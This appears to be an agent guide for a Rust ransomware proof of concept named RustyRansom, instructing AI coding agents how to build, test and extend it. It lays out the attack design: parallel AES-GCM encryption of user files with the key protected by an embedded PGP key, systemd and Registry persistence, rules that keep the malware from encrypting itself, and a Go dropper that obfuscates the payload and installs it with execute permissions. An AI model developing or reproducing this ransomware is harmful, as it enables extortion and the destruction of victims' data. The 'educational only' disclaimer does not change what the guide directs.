# RustyRansom - Agent Guide

A Rust-based ransomware PoC demonstrating hybrid cryptography and cross-platform persistence. Educational/research purposes only.

---

## Build & Test Commands

### Build
```bash
# Debug build
cargo build

# Release build (optimized)
cargo build --release

# Windows cross-compilation target
cargo build --release --target x86_64-pc-windows-gnu
```

### Test
```bash
# Run all tests
cargo test

# Run specific test
cargo test <test_name>

# Run tests with output
cargo test -- --nocapture

# Run test in specific module
cargo test --lib encryption::tests::test_name
```

### Lint & Format
```bash
# Check with clippy (MUST pass before commit)
cargo clippy -- -D warnings

# Format code
cargo fmt

# Check formatting without changing files
cargo fmt -- --check
```

### Run
```bash
# Debug run
cargo run

# Release run (optimized performance)
cargo run --release
```

---

## Project Structure

```
src/
├── main.rs          # Entry point: orchestrates encryption, persistence, key recovery
├── encryption.rs    # AES-256-GCM streaming encryption with rayon parallelization
├── persistence.rs   # OS-specific persistence (Linux systemd / Windows Registry)
└── recovery.rs      # PGP-based session key protection and recovery file generation
```

**Modular Design**: Each module has a single responsibility. Keep it this way.

---

## Code Style Guidelines

### Imports
- **Group by source**: std → external crates → local modules
- **Alphabetize** within groups
- **Avoid glob imports** (`use crate::*`) - be explicit

```rust
// Good
use aes_gcm::{Aes256Gcm, aead::OsRng};
use dirs2::home_dir;
use std::{
    fs::{File, read_dir},
    io::{Error, Result},
};
use crate::encryption::encrypt_files;

// Bad
use std::*;
use aes_gcm::*;
```

### Formatting
- **4 spaces** for indentation (no tabs)
- **100 character line limit** - break long lines at logical boundaries
- **rustfmt compliance**: Run `cargo fmt` before every commit
- **Trailing commas** in multi-line structs/enums/match arms

### Naming Conventions
- **snake_case**: functions, variables, modules (`encrypt_file`, `save_key`)
- **PascalCase**: types, traits, enums (`Aes256Gcm`, `SignedPublicKey`)
- **SCREAMING_SNAKE_CASE**: constants (`PUB_KEY_ENCODED`)
- **Descriptive names**: Prefer `encrypted_data` over `data1`

### Types
- **Explicit return types** on all public functions
- **Prefer `Result<T, E>`** over panicking (use `?` operator)
- **Avoid unwrap()**: Use `expect()` with descriptive messages or proper error handling
- **Type inference**: Use where obvious, but annotate complex types

```rust
// Good
pub fn save_key(key: Vec<u8>) -> Result<()> {
    let public_key = decode_key()
        .map_err(|_| Error::other("Failed to decode public key"))?;
    // ...
}

// Bad - panics on error
pub fn save_key(key: Vec<u8>) {
    let public_key = decode_key().unwrap();
}
```

### Error Handling
- **Propagate with `?`** in functions returning Result
- **Use `map_err`** for meaningful context transformation
- **Never silently ignore errors** - at minimum log with `println!` or `eprintln!`
- **Prefer `Error::other()`** for std::io::Error conversions

```rust
// Good
gz.read_to_string(&mut unzipped_key)
    .map_err(|_| Error::other("Failed to unzip public key"))?;

// Bad
let _ = gz.read_to_string(&mut unzipped_key); // silently ignores failure
```

### Memory Safety & Security
- **Zeroize sensitive data**: Always use `zeroize` crate for keys in memory
- **Stream large files**: Use `BufReader` + chunking (4KB) to avoid OOM
- **Clone carefully**: Only clone `Aes256Gcm` for parallel operations (rayon)
- **Avoid unnecessary copies**: Use references where possible

### Concurrency
- **Rayon for parallelism**: Use `par_bridge()` on iterators for CPU-bound tasks
- **Thread-safe cloning**: Ensure ciphers/data are safely cloned before `into_par_iter()`
- **Error handling in parallel**: Capture errors per-item, don't panic threads

```rust
entries.par_bridge().into_par_iter().for_each(|entry| {
    if let Ok(entry) = entry {
        if let Err(e) = encrypt_file(path, cipher.clone()) {
            println!("Error: {e}"); // per-item error handling
        }
    }
});
```

### Comments
- **Document intent, not mechanics**: Explain *why*, not *what* (code shows what)
- **Function-level comments** for complex logic
- **Inline comments** only when non-obvious (crypto operations, nonce handling)
- **TODO/FIXME**: Mark incomplete or known issues explicitly

```rust
// Good
// Stream encryptor needs an 8-byte nonce (not the full 12-byte GCM nonce)
let nonce_stream = GenericArray::from_slice(&nonce[0..8]);

// Bad
// Create nonce stream
let nonce_stream = GenericArray::from_slice(&nonce[0..8]);
```

---

## Architecture Patterns

### Cryptographic Flow
1. **Key Generation**: `Aes256Gcm::generate_key(OsRng)` in main
2. **Session Key Protection**: Encrypt with embedded PGP public key (recovery.rs)
3. **File Encryption**: Streaming AES-256-GCM with per-file nonces (encryption.rs)
4. **Zeroize**: Scrub key from memory after encryption

### Platform-Specific Code
- Use `#[cfg(target_os = "...")]` for conditional compilation
- Keep platform logic isolated in persistence.rs
- Test both Linux and Windows paths (where applicable)

### Error Resilience
- **Continue on failure**: Locked/inaccessible files shouldn't crash entire operation
- **Log errors**: Print to console, continue processing
- **Fail early on critical**: Abort only if key generation/persistence fails

---

## Self-Protection Patterns

The ransomware implements multiple layers of self-protection to prevent operational failures:

### Extension Blacklist
**What:** Hardcoded list of file extensions to never encrypt  
**Why:** Prevents self-encryption, system instability, and loss of recovery key  
**Implementation:**
- Constant array: `["key", "ciro", "exe", "dll", "sys", "so", "ko"]`
- Check before encryption via `should_encrypt(path)`
- Files without extensions are automatically protected (no-extension rule)

**Location:** `src/encryption.rs` - `should_encrypt()` function

**Rationale per extension:**
- `.key` - Recovery key file (encrypted session key)
- `.ciro` - Already encrypted files (marked by ransomware)
- `.exe`, `.dll`, `.sys` - Windows executables/libraries (system stability)
- `.so`, `.ko` - Linux shared libraries/kernel modules (system stability)

### Self-Executable Detection
**What:** Canonical path comparison to detect the ransomware binary itself  
**Why:** Prevents encrypting the executable while it's running (immediate failure)  
**Implementation:**
```rust
let exe_path = env::current_exe()?.canonicalize()?;
let file_path = path.canonicalize()?;
if exe_path == file_path {
    return false; // Skip self
}
```

**Location:** `src/encryption.rs` - `is_self_executable()` function

**Why canonical paths:** Resolves symlinks and relative paths to ensure accurate comparison

### No-Extension Protection
**What:** Files without extensions are automatically skipped  
**Why:** Protects Linux binaries (e.g., `/bin/ls`, `./rustyransom`) which typically lack extensions  
**Implementation:**
```rust
if path.extension().is_none() {
    return false;
}
```

**Location:** `src/encryption.rs` - `should_encrypt()` function

**Side effect:** Also protects directories, sockets, and other special files

---

## Dropper Deployment Patterns

The Go dropper uses Base64 + Gzip encoding for payload obfuscation and size reduction.

### Payload Encoding Pipeline
**Format:** Rust binary → Gzip compress → Base64 encode → Embed in Go source

**Why this pipeline:**
1. **Gzip:** Reduces ~80KB binary to ~40KB (50% compression)
2. **Base64:** Text-safe encoding for embedding in source (expands to ~55KB)
3. **Result:** Net 30% size reduction vs raw binary in hex

### Platform-Specific Deployment

#### Linux (`dropper/linux_dropper.go`)
```go
// Deployment path
path := filepath.Join(shareDir, "rustyransom")

// CRITICAL: Must set execute permissions
os.Chmod(path, 0755)
```

**Why `/usr/share/`:** Standard location for application data, doesn't require root  
**Why `0755`:** Read/execute for all, write only for owner

#### Windows (`dropper/windows_dropper.go`)
```go
// Deployment path
path := filepath.Join(public_dir, "rustyransom.exe")

// No chmod needed - Windows uses ACLs, .exe extension required
```

**Why `%PUBLIC%`:** Accessible to all users without admin privileges  
**Why `.exe` extension:** Windows requires explicit extension for PE executables

### Common Mistakes
1. **Forgetting `os.Chmod()` on Linux** - Binary won't execute (permission denied)
2. **Missing `.exe` on Windows** - System won't recognize as executable
3. **Using wrong directory** - May require elevated privileges or be inaccessible

---

## Common Pitfalls

1. **Don't panic in production**: Replace `unwrap()` with `expect()` or `?`
2. **Avoid loading entire files**: Always use `BufReader` + chunking for files
3. **Test parallel code**: Rayon can hide race conditions - test with `cargo test -- --test-threads=1`
4. **Nonce confusion**: AES-GCM nonce is 12 bytes, stream encryptor needs 8 bytes (first 8 of GCM nonce)
5. **Cross-platform paths**: Use `PathBuf::join()`, never string concatenation
6. **Dropper chmod**: Always call `os.Chmod(path, 0755)` after writing binary on Linux

---

## Before You Commit

- [ ] `cargo fmt` - code is formatted
- [ ] `cargo clippy -- -D warnings` - no lint warnings
- [ ] `cargo build --release` - release build succeeds
- [ ] `cargo test` - all tests pass
- [ ] Review diff - no debug prints, commented code, or TODOs left unaddressed

---

## Security & Ethics

**This is a PoC for educational purposes ONLY.**

- Never deploy against real systems without authorization
- Understand legal/ethical implications of ransomware research
- Use isolated VMs/containers for testing
- Report vulnerabilities responsibly

---

## Key Dependencies

- **aes-gcm** (0.10.3): Authenticated encryption with stream mode
- **pgp** (0.18.0): Asymmetric key operations for session key protection
- **rayon** (1.10.0): Data parallelism for file traversal
- **zeroize** (1.8.2): Secure memory clearing
- **flate2** (1.1.8): Gzip compression/decompression
- **base64** (0.22.1): Key encoding

Check Cargo.toml for version specifics before updating dependencies.
